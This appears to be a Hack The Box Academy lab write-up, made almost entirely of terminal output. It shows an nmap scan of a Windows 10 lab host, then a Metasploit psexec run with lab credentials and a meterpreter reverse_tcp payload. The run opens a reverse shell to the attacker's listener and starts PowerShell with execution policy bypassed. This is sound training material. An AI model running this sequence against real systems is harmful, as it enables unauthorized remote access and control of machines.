# Metasploit - Automating Payloads & Delivery

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -Pn 10.129.201.160
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-01 02:11 -0400
Stats: 0:01:48 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 90.00% done; ETC: 02:13 (0:00:12 remaining)
Stats: 0:02:34 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 90.00% done; ETC: 02:14 (0:00:17 remaining)
Stats: 0:03:22 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.86% done; ETC: 02:14 (0:00:00 remaining)
Nmap scan report for 10.129.201.160
Host is up (0.54s latency).
Not shown: 990 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
7/tcp    open  echo
9/tcp    open  discard?
13/tcp   open  daytime      Microsoft Windows USA daytime
17/tcp   open  qotd         Windows qotd (English)
19/tcp   open  chargen
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 10 Pro 18363 microsoft-ds (workgroup: WORKGROUP)
2179/tcp open  vmrdp?
Service Info: Host: SHELLS-WIN10; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 10 Pro 18363 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Shells-Win10
|   NetBIOS computer name: SHELLS-WIN10\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-06-30T23:14:19-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-07-01T06:14:17
|_  start_date: N/A
|_clock-skew: mean: 2h20m01s, deviation: 4h02m31s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 222.58 seconds

```

```bash
                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole
[sudo] password for kali: 
Metasploit tip: Use the edit command to open the currently active module 
in your editor
                                                  
  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |
  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
  |             )=\           | |  EXPLOIT   \            |
  |            // \\          | |_____________\_______    |
  |           //   \\         | |==[msf >]============\   |
  |          //     \\        | |______________________\  |
  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
  |        //         \\      |  *********************    |
  +---------------------------+---------------------------+
  |      o O o                |        \'\/\/\/'/         |
  |              o O          |         )======(          |
  |                 o         |       .'  LOOT  '.        |
  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
  | |________________|__|)__| |    |     __||_)     |     |
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
  |  = = = = = = = = = = = =  |     '--------------'      |
  +---------------------------+---------------------------+

       =[ metasploit v6.4.135-dev                               ]
+ -- --=[ 2,654 exploits - 1,338 auxiliary - 2,141 payloads     ]
+ -- --=[ 433 post - 49 encoders - 14 nops - 12 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

```

```bash
msf exploit(windows/smb/smb_rras_erraticgopher) > use 248
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share

   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on

   Used when making a new connection via RHOSTS:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      445              no        The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication                                                                                      
   SMBPass                     no        The password for the specified username                                                                                           
   SMBUser                     no        The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.166.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

View the full module info with the info, or info -d command.

msf exploit(windows/smb/psexec) > set RHOSTS 10.129.201.160
RHOSTS => 10.129.201.160
msf exploit(windows/smb/psexec) > set RPORT 445
RPORT => 445
msf exploit(windows/smb/psexec) > Interrupt: use the 'exit' command to quit
msf exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf exploit(windows/smb/psexec) > 
msf exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
msf exploit(windows/smb/psexec) > set LHOST 10.10.17.227
LHOST => 10.10.17.227
msf exploit(windows/smb/psexec) > set LPORT 4444
LPORT => 4444
msf exploit(windows/smb/psexec) > exploit
[*] Started reverse TCP handler on 10.10.17.227:4444 
[*] 10.129.201.160:445 - Connecting to the server...
[*] 10.129.201.160:445 - Authenticating to 10.129.201.160:445 as user 'htb-student'...
[*] 10.129.201.160:445 - Selecting PowerShell target
[*] 10.129.201.160:445 - Executing the payload...
[+] 10.129.201.160:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (199238 bytes) to 10.129.201.160
[*] Meterpreter session 1 opened (10.10.17.227:4444 -> 10.129.201.160:49875) at 2026-07-01 02:37:37 -0400

meterpreter > shell
Process 1512 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18363.1854]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\system32> 
```